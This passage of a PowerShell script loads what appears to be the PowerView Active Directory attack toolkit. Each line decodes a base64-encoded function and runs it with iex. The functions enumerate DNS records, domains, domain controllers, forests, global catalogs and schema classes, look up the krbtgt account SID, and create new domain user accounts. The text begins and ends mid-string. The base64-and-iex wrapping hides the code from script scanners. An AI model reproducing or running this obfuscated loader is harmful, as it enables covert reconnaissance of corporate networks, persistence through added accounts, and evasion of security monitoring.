0eSAkXy5OYW1lICRfLlZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgJE91dC5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuRE5TUmVjb3JkJykKICAgICAgICAgICAgICAgICAgICAkT3V0CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1Eb21haW5ETlNSZWNvcmRdIEVycm9yOiAkXyIKICAgICAgICAgICAgICAgICAgICAkT3V0CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRSZXN1bHRzKSB7CiAgICAgICAgICAgICAgICB0cnkgeyAkUmVzdWx0cy5kaXNwb3NlKCkgfQogICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluRE5TUmVjb3JkXSBFcnJvciBkaXNwb3Npbmcgb2YgdGhlIFJlc3VsdHMgb2JqZWN0OiAkXyIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAkRE5TU2VhcmNoZXIuZGlzcG9zZSgpCiAgICAgICAgfQogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpbiB7CiAgICBbT3V0cHV0VHlwZShbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeS5Eb21haW5dKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCiAgICBQUk9DRVNTIHsKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnW0dldC1Eb21haW5dIFVzaW5nIGFsdGVybmF0ZSBjcmVkZW50aWFscyBmb3IgR2V0LURvbWFpbicKICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsKICAgICAgICAgICAgICAgICRUYXJnZXREb21haW4gPSAkRG9tYWluCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAkVGFyZ2V0RG9tYWluID0gJENyZWRlbnRpYWwuR2V0TmV0d29ya0NyZWRlbnRpYWwoKS5Eb21haW4KICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluXSBFeHRyYWN0ZWQgZG9tYWluICckVGFyZ2V0RG9tYWluJyBmcm9tIC1DcmVkZW50aWFsIgogICAgICAgICAgICB9CiAgICAgICAgICAgICREb21haW5Db250ZXh0ID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkRpcmVjdG9yeUNvbnRleHQoJ0RvbWFpbicsICRUYXJnZXREb21haW4sICRDcmVkZW50aWFsLlVzZXJOYW1lLCAkQ3JlZGVudGlhbC5HZXROZXR3b3JrQ3JlZGVudGlhbCgpLlBhc3N3b3JkKQogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnkuRG9tYWluXTo6R2V0RG9tYWluKCREb21haW5Db250ZXh0KQogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluXSBUaGUgc3BlY2lmaWVkIGRvbWFpbiAnJFRhcmdldERvbWFpbicgZG9lcyBub3QgZXhpc3QsIGNvdWxkIG5vdCBiZSBjb250YWN0ZWQsIHRoZXJlIGlzbid0IGFuIGV4aXN0aW5nIHRydXN0LCBvciB0aGUgc3BlY2lmaWVkIGNyZWRlbnRpYWxzIGFyZSBpbnZhbGlkOiAkXyIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsKICAgICAgICAgICAgJERvbWFpbkNvbnRleHQgPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnkuRGlyZWN0b3J5Q29udGV4dCgnRG9tYWluJywgJERvbWFpbikKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkRvbWFpbl06OkdldERvbWFpbigkRG9tYWluQ29udGV4dCkKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbl0gVGhlIHNwZWNpZmllZCBkb21haW4gJyREb21haW4nIGRvZXMgbm90IGV4aXN0LCBjb3VsZCBub3QgYmUgY29udGFjdGVkLCBvciB0aGVyZSBpc24ndCBhbiBleGlzdGluZyB0cnVzdCA6ICRfIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnkuRG9tYWluXTo6R2V0Q3VycmVudERvbWFpbigpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5dIEVycm9yIHJldHJpZXZpbmcgdGhlIGN1cnJlbnQgZG9tYWluOiAkXyIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpbkNvbnRyb2xsZXIgewogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuQ29tcHV0ZXInKV0KICAgIFtPdXRwdXRUeXBlKCdTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkRvbWFpbkNvbnRyb2xsZXInKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJExEQVAsCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCiAgICBQUk9DRVNTIHsKICAgICAgICAkQXJndW1lbnRzID0gQHt9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJEFyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJEFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0xEQVAnXSAtb3IgJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgewogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgICAgICAkQXJndW1lbnRzWydMREFQRmlsdGVyJ10gPSAnKHVzZXJBY2NvdW50Q29udHJvbDoxLjIuODQwLjExMzU1Ni4xLjQuODAzOj04MTkyKScKICAgICAgICAgICAgR2V0LURvbWFpbkNvbXB1dGVyIEBBcmd1bWVudHMKICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRGb3VuZERvbWFpbiA9IEdldC1Eb21haW4gQEFyZ3VtZW50cwogICAgICAgICAgICBpZiAoJEZvdW5kRG9tYWluKSB7CiAgICAgICAgICAgICAgICAkRm91bmREb21haW4uRG9tYWluQ29udHJvbGxlcnMKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LUZvcmVzdCB7CiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1N5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDdXN0b21PYmplY3QnKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRGb3Jlc3QsCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCiAgICBQUk9DRVNTIHsKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Gb3Jlc3RdIFVzaW5nIGFsdGVybmF0ZSBjcmVkZW50aWFscyBmb3IgR2V0LUZvcmVzdCIKICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRm9yZXN0J10pIHsKICAgICAgICAgICAgICAgICRUYXJnZXRGb3Jlc3QgPSAkRm9yZXN0CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAkVGFyZ2V0Rm9yZXN0ID0gJENyZWRlbnRpYWwuR2V0TmV0d29ya0NyZWRlbnRpYWwoKS5Eb21haW4KICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRm9yZXN0XSBFeHRyYWN0ZWQgZG9tYWluICckRm9yZXN0JyBmcm9tIC1DcmVkZW50aWFsIgogICAgICAgICAgICB9CiAgICAgICAgICAgICRGb3Jlc3RDb250ZXh0ID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkRpcmVjdG9yeUNvbnRleHQoJ0ZvcmVzdCcsICRUYXJnZXRGb3Jlc3QsICRDcmVkZW50aWFsLlVzZXJOYW1lLCAkQ3JlZGVudGlhbC5HZXROZXR3b3JrQ3JlZGVudGlhbCgpLlBhc3N3b3JkKQogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgJEZvcmVzdE9iamVjdCA9IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkZvcmVzdF06OkdldEZvcmVzdCgkRm9yZXN0Q29udGV4dCkKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LUZvcmVzdF0gVGhlIHNwZWNpZmllZCBmb3Jlc3QgJyRUYXJnZXRGb3Jlc3QnIGRvZXMgbm90IGV4aXN0LCBjb3VsZCBub3QgYmUgY29udGFjdGVkLCB0aGVyZSBpc24ndCBhbiBleGlzdGluZyB0cnVzdCwgb3IgdGhlIHNwZWNpZmllZCBjcmVkZW50aWFscyBhcmUgaW52YWxpZDogJF8iCiAgICAgICAgICAgICAgICAkTnVsbAogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2VpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydGb3Jlc3QnXSkgewogICAgICAgICAgICAkRm9yZXN0Q29udGV4dCA9IE5ldy1PYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeS5EaXJlY3RvcnlDb250ZXh0KCdGb3Jlc3QnLCAkRm9yZXN0KQogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgJEZvcmVzdE9iamVjdCA9IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkZvcmVzdF06OkdldEZvcmVzdCgkRm9yZXN0Q29udGV4dCkKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LUZvcmVzdF0gVGhlIHNwZWNpZmllZCBmb3Jlc3QgJyRGb3Jlc3QnIGRvZXMgbm90IGV4aXN0LCBjb3VsZCBub3QgYmUgY29udGFjdGVkLCBvciB0aGVyZSBpc24ndCBhbiBleGlzdGluZyB0cnVzdDogJF8iCiAgICAgICAgICAgICAgICByZXR1cm4gJE51bGwKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgJEZvcmVzdE9iamVjdCA9IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkZvcmVzdF06OkdldEN1cnJlbnRGb3Jlc3QoKQogICAgICAgIH0KICAgICAgICBpZiAoJEZvcmVzdE9iamVjdCkgewogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsKICAgICAgICAgICAgICAgICRGb3Jlc3RTaWQgPSAoR2V0LURvbWFpblVzZXIgLUlkZW50aXR5ICJrcmJ0Z3QiIC1Eb21haW4gJEZvcmVzdE9iamVjdC5Sb290RG9tYWluLk5hbWUgLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwpLm9iamVjdHNpZAogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgJEZvcmVzdFNpZCA9IChHZXQtRG9tYWluVXNlciAtSWRlbnRpdHkgImtyYnRndCIgLURvbWFpbiAkRm9yZXN0T2JqZWN0LlJvb3REb21haW4uTmFtZSkub2JqZWN0c2lkCiAgICAgICAgICAgIH0KICAgICAgICAgICAgJFBhcnRzID0gJEZvcmVzdFNpZCAtU3BsaXQgJy0nCiAgICAgICAgICAgICRGb3Jlc3RTaWQgPSAkUGFydHNbMC4uJCgkUGFydHMubGVuZ3RoLTIpXSAtam9pbiAnLScKICAgICAgICAgICAgJEZvcmVzdE9iamVjdCB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdSb290RG9tYWluU2lkJyAkRm9yZXN0U2lkCiAgICAgICAgICAgICRGb3Jlc3RPYmplY3QKICAgICAgICB9CiAgICB9Cn0K")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LUZvcmVzdERvbWFpbiB7CiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnkuRG9tYWluJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRm9yZXN0LAogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQogICAgUFJPQ0VTUyB7CiAgICAgICAgJEFyZ3VtZW50cyA9IEB7fQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0ZvcmVzdCddKSB7ICRBcmd1bWVudHNbJ0ZvcmVzdCddID0gJEZvcmVzdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICAkRm9yZXN0T2JqZWN0ID0gR2V0LUZvcmVzdCBAQXJndW1lbnRzCiAgICAgICAgaWYgKCRGb3Jlc3RPYmplY3QpIHsKICAgICAgICAgICAgJEZvcmVzdE9iamVjdC5Eb21haW5zCiAgICAgICAgfQogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LUZvcmVzdEdsb2JhbENhdGFsb2cgewogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5Lkdsb2JhbENhdGFsb2cnKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRGb3Jlc3QsCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCiAgICBQUk9DRVNTIHsKICAgICAgICAkQXJndW1lbnRzID0gQHt9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRm9yZXN0J10pIHsgJEFyZ3VtZW50c1snRm9yZXN0J10gPSAkRm9yZXN0IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJEFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgICAgICRGb3Jlc3RPYmplY3QgPSBHZXQtRm9yZXN0IEBBcmd1bWVudHMKICAgICAgICBpZiAoJEZvcmVzdE9iamVjdCkgewogICAgICAgICAgICAkRm9yZXN0T2JqZWN0LkZpbmRBbGxHbG9iYWxDYXRhbG9ncygpCiAgICAgICAgfQogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LUZvcmVzdFNjaGVtYUNsYXNzIHsKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZShbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeS5BY3RpdmVEaXJlY3RvcnlTY2hlbWFDbGFzc10pXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0NsYXNzJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJENsYXNzTmFtZSwKICAgICAgICBbQWxpYXMoJ05hbWUnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJEZvcmVzdCwKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKICAgIFBST0NFU1MgewogICAgICAgICRBcmd1bWVudHMgPSBAe30KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydGb3Jlc3QnXSkgeyAkQXJndW1lbnRzWydGb3Jlc3QnXSA9ICRGb3Jlc3QgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAgICAgJEZvcmVzdE9iamVjdCA9IEdldC1Gb3Jlc3QgQEFyZ3VtZW50cwogICAgICAgIGlmICgkRm9yZXN0T2JqZWN0KSB7CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NsYXNzTmFtZSddKSB7CiAgICAgICAgICAgICAgICBGb3JFYWNoICgkVGFyZ2V0Q2xhc3MgaW4gJENsYXNzTmFtZSkgewogICAgICAgICAgICAgICAgICAgICRGb3Jlc3RPYmplY3QuU2NoZW1hLkZpbmRDbGFzcygkVGFyZ2V0Q2xhc3MpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAkRm9yZXN0T2JqZWN0LlNjaGVtYS5GaW5kQWxsQ2xhc3NlcygpCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0K")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gTmV3LURvbWFpblVzZXIgewogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTVXNlU2hvdWxkUHJvY2Vzc0ZvclN0YXRlQ2hhbmdpbmdGdW5jdGlvbnMnLCAnJyldCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ0RpcmVjdG9yeVNlcnZpY2VzLkFjY291bnRNYW5hZ2VtZW50LlVzZXJQcmluY2lwYWwnKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtWYWxpZGF0ZUxlbmd0aCgwLCAyNTYpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNhbUFjY291bnROYW1lLAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdQYXNzd29yZCcpXQogICAgICAgIFtTZWN1cml0eS5TZWN1cmVTdHJpbmddCiAgICAgICAgJEFjY291bnRQYXNzd29yZCwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJE5hbWUsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREaXNwbGF5TmFtZSwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERlc2NyaXB0aW9uLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQogICAgJENvbnRleHRBcmd1bWVudHMgPSBAewogICAgICAgICdJZGVudGl0eScgPSAkU2FtQWNjb3VudE5hbWUKICAgIH0KICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRDb250ZXh0QXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRDb250ZXh0QXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAkQ29udGV4dCA9IEdldC1QcmluY2lwYWxDb250ZXh0IEBDb250ZXh0QXJndW1lbnRzCiAgICBpZiAoJENvbnRleHQpIHsKICAgICAgICAkVXNlciA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY2NvdW50TWFuYWdlbWVudC5Vc2VyUHJpbmNpcGFsIC1Bcmd1bWVudExpc3QgKCRDb250ZXh0LkNvbnRleHQpCiAgICAgICAgJFVzZXIuU2FtQWNjb3VudE5hbWUgPSAkQ29udGV4dC5JZGVudGl0eQogICAgICAgICRUZW1wQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ2EnLCAkQWNjb3VudFBhc3N3b3JkKQogICAgICAgICRVc2VyLlNldFBhc3N3b3JkKCRUZW1wQ3JlZC5HZXROZXR3b3JrQ3JlZGVudGlhbCgpLlBhc3N3b3JkKQogICAgICAgICRVc2VyLkVuYWJsZWQgPSAkVHJ1ZQogICAgICAgICRVc2VyLlBhc3N3b3JkTm90UmVxdWlyZWQgPSAkRmFsc2UKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydOYW1lJ10pIHsKICAgICAgICAgICAgJFVzZXIuTmFtZSA9ICROYW1lCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAkVXNlci5OYW1lID0gJENvbnRleHQuSWRlbnRpdHkKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRGlzcGxheU5hbWUnXSkgewogICAgICAgICAgICAkVXNlci5EaXNwbGF5TmFtZSA9ICREaXNwbGF5TmFtZQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgJFVzZXIuRGlzcGxheU5hbWUgPSAkQ29udGV4dC5JZGVudGl0eQogICAgICAgIH0